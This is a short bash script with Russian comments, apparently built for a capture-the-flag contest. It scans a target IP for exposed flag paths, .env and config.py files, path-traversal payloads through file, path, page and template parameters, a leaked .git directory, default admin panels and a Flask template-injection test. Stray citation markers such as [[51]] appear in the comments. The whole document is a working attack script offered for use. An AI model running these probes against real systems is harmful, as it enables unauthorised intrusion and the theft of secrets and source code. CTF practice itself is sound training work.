#!/bin/bash
TARGET=$1  # IP цели, например 10.60.5.3

echo "[*] Сканируем $TARGET..."

# 1. Проверка стандартных путей к флагам
for path in "/flag" "/flags" "/api/flag" "/admin/flag" "/debug/flag" "/.env" "/config.py"; do
    curl -s "http://$TARGET$path" -o /dev/null -w "%{http_code} $path\n" | grep -E "^200"
done

# 2. Path Traversal (LFI) — очень частая уязвимость в учебных CTF [[51]]
for param in "file" "path" "page" "template"; do
    curl -s "http://$TARGET/download?$param=../../flag" | grep -E "[A-Z0-9]{31}=|CTF\{"
    curl -s "http://$TARGET/view?$param=....//....//flag" | grep -E "[A-Z0-9]{31}=|CTF\{"
done

# 3. Проверка .git утечки
if curl -s "http://$TARGET/.git/HEAD" | grep -q "ref:"; then
    echo "[!] .git доступен! Скачиваем: git clone http://$TARGET/.git"
fi

# 4. Дефолтные админки
for admin in "/admin" "/administrator" "/wp-admin" "/phpmyadmin"; do
    curl -s "http://$TARGET$admin" -o /dev/null -w "%{http_code} $admin\n" | grep -E "^200|^302"
done

# 5. SSTI в Flask (если виден шаблон) [[49]][[56]]
curl -s "http://$TARGET/search?q={{7*7}}" | grep -q "49" && echo "[!] Возможна SSTI!"

echo "[*] Сканирование завершено"